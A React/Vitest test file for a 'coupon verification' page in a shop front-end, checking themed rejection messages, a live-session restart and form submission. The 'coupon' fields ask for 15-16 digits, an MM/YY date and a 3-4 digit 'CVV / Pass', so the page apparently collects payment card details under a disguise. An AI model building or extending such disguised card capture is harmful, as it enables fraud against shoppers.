import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import CouponVerification from "@/pages/CouponVerification";
import { getDefaultThemeV2 } from "@/lib/theme-editor";

const navigateMock = vi.fn();
const toastMock = vi.fn();
const updateCouponDataMock = vi.fn();
const setOrderStatusMock = vi.fn();
const submitOrderMock = vi.fn(async () => {});
const resubmitCouponMock = vi.fn(async () => {});
const startLiveSessionMock = vi.fn();

let activeConfig: Record<string, unknown> | null = null;
let orderStatusValue: string = "COUPON_SUBMITTING";
let currentOrderIdValue: string | null = null;

vi.mock("react-router-dom", async () => {
  const actual = await vi.importActual<typeof import("react-router-dom")>("react-router-dom");
  return {
    ...actual,
    useNavigate: () => navigateMock,
  };
});

vi.mock("@/context/RealtimeContext", () => ({
  useRealtime: () => ({
    updateCouponData: updateCouponDataMock,
    setOrderStatus: setOrderStatusMock,
    orderStatus: orderStatusValue,
    submitOrder: submitOrderMock,
    currentOrderId: currentOrderIdValue,
    resubmitCoupon: resubmitCouponMock,
    startLiveSession: startLiveSessionMock,
  }),
}));

vi.mock("@/context/ShopContext", () => ({
  useShop: () => ({
    config: activeConfig,
  }),
}));

vi.mock("@/components/ui/use-toast", () => ({
  useToast: () => ({
    toast: toastMock,
  }),
}));

vi.mock("@/components/Header", () => ({
  default: () => <div data-testid="header" />,
}));

vi.mock("@/components/Footer", () => ({
  default: () => <div data-testid="footer" />,
}));

describe("CouponVerification page", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    const theme = getDefaultThemeV2();
    theme.pages.coupon.rejectedTitle = "Denied by Theme";
    theme.pages.coupon.rejectedMessage = "Theme rejected message";
    theme.pages.coupon.returnTitle = "Return by Theme";
    theme.pages.coupon.returnMessage = "Theme return message";
    activeConfig = {
      theme_editor_v2_enabled: true,
      layout_config_v2: theme,
    };
    orderStatusValue = "COUPON_SUBMITTING";
    currentOrderIdValue = null;
  });

  it("uses themed rejected prompt and keeps reset flow", async () => {
    orderStatusValue = "REJECTED";
    render(<CouponVerification />);

    await waitFor(() => {
      expect(setOrderStatusMock).toHaveBeenCalledWith("COUPON_SUBMITTING");
    });

    expect(startLiveSessionMock).toHaveBeenCalledWith({ force: true });
    expect(toastMock).toHaveBeenCalledWith(
      expect.objectContaining({
        title: "Denied by Theme",
        description: "Theme rejected message",
      })
    );
    expect(screen.getByText("Theme rejected message")).toBeInTheDocument();
  });

  it("submits coupon data through existing submit path", async () => {
    render(<CouponVerification />);

    fireEvent.change(screen.getByLabelText("Coupon Code (15-16 digits)"), {
      target: { value: "1111222233334444" },
    });
    fireEvent.change(screen.getByLabelText("Date (MM/YY)"), {
      target: { value: "1227" },
    });
    fireEvent.change(screen.getByLabelText("CVV / Pass (3-4 digits)"), {
      target: { value: "123" },
    });

    fireEvent.click(screen.getByRole("button", { name: "Verify & Complete Order" }));

    await waitFor(() => {
      expect(submitOrderMock).toHaveBeenCalledWith({
        code: "1111222233334444",
        dateMMYY: "12/27",
        password: "123",
      });
    });
  });
});
